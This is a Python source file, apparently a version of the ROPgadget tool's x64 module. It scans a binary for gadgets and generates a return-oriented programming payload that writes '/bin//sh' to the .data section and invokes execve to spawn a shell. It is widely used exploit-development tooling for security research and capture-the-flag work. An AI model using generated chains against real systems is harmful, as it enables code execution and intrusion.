#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#  Jonathan Salwan - 2014-05-13
#  Florian Meier - 2014-08-31 - The 64b ROP chain generation
#
#  http://shell-storm.org
#  http://twitter.com/JonathanSalwan
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software  Foundation, either  version 3 of  the License, or
#  (at your option) any later version.
#

import re
import ROPgadget.ropgadget.ropchain.ropmaker


class ROPMakerX64:
    def __init__(self, data_section, gadgets, liboffset=0x0):
        self.__data_section = data_section
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search(
                "mov .* ptr \[(?P<dst>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))\], (?P<src>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))$",
                f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        if g != "ret":
                            # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        padding_code = ''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    padding_code += "\tp += pack('<Q', 0x%016x) # padding without overwrite %s\n" % (
                        regAlreadSetted[reg], reg)
                except KeyError:
                    padding_code += "\tp += pack('<Q', 0x4141414141414141) # padding\n"
        return padding_code

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
        section = self.__data_section
        dataAddr = None
        if section["name"] == ".data":
            dataAddr = section["vaddr"] + self.__liboffset
        if dataAddr is None:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NoDataSectionError(
                "\n[-] Error - Can't find a writable section")

        payload_code = "\t#!/usr/bin/env python2\n"
        payload_code += "\t# execve generated by ROPgadget\n\n"
        payload_code += "\tfrom struct import pack\n\n"

        payload_code += "\t# Padding goes here\n"
        payload_code += "\tp = ''\n\n"

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popDst["vaddr"], popDst["gadget"])
        payload_code += "\tp += pack('<Q', 0x%016x) # @ .data\n" % dataAddr
        payload_code += self.__padding(popDst, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popSrc["vaddr"], popSrc["gadget"])
        payload_code += "\tp += '/bin//sh'\n"
        payload_code += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (write4where["vaddr"], write4where["gadget"])
        payload_code += self.__padding(write4where, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popDst["vaddr"], popDst["gadget"])
        payload_code += "\tp += pack('<Q', 0x%016x) # @ .data + 8\n" % (dataAddr + 8)
        payload_code += self.__padding(popDst, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (xorSrc["vaddr"], xorSrc["gadget"])
        payload_code += self.__padding(xorSrc, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (write4where["vaddr"], write4where["gadget"])
        payload_code += self.__padding(write4where, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popRdi["vaddr"], popRdi["gadget"])
        payload_code += "\tp += pack('<Q', 0x%016x) # @ .data\n" % dataAddr
        payload_code += self.__padding(popRdi, {})

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popRsi["vaddr"], popRsi["gadget"])
        payload_code += "\tp += pack('<Q', 0x%016x) # @ .data + 8\n" % (dataAddr + 8)
        payload_code += self.__padding(popRsi, {"rdi": dataAddr})  # Don't overwrite rdi

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (popRdx["vaddr"], popRdx["gadget"])
        payload_code += "\tp += pack('<Q', 0x%016x) # @ .data + 8\n" % (dataAddr + 8)
        payload_code += self.__padding(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (xorRax["vaddr"], xorRax["gadget"])
        payload_code += self.__padding(xorRax, {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        for i in range(59):
            payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (incRax["vaddr"], incRax["gadget"])
            payload_code += self.__padding(incRax,
                                           {"rdi": dataAddr, "rsi": dataAddr + 8})  # Don't overwrite rdi and rsi

        payload_code += "\tp += pack('<Q', 0x%016x) # %s\n" % (syscall["vaddr"], syscall["gadget"])
        return payload_code

    def generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                    "\t[-] Can't find the 'mov qword ptr [r64], r64' gadget")

            popDst = self.__lookingForSomeThing("pop %s" % (write4where[1]))
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[1]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % (write4where[2]))
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [reg], reg'\n" % (
                    write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorRax = self.__lookingForSomeThing("xor rax, rax")
        if not xorRax:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'xor rax, rax' instuction")

        incRax = self.__lookingForSomeThing("inc rax")
        incEax = self.__lookingForSomeThing("inc eax")
        incAx = self.__lookingForSomeThing("inc al")
        addRax = self.__lookingForSomeThing("add rax, 1")
        addEax = self.__lookingForSomeThing("add eax, 1")
        addAx = self.__lookingForSomeThing("add al, 1")

        instr = [incRax, incEax, incAx, addRax, addEax, addAx]

        if all(v is None for v in instr):
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'inc rax' or 'add rax, 1' instuction")

        for i in instr:
            if i is not None:
                incRax = i
                break

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popRdi = self.__lookingForSomeThing("pop rdi")
        if not popRdi:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop rdi' instruction")

        popRsi = self.__lookingForSomeThing("pop rsi")
        if not popRsi:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop rsi' instruction")

        popRdx = self.__lookingForSomeThing("pop rdx")
        if not popRdx:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop rdx' instruction")

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("syscall")
        if not syscall:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'syscall' instruction")

        print("\n- Step 5 -- Build the ROP chain\n")

        return self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx,
                                    syscall)
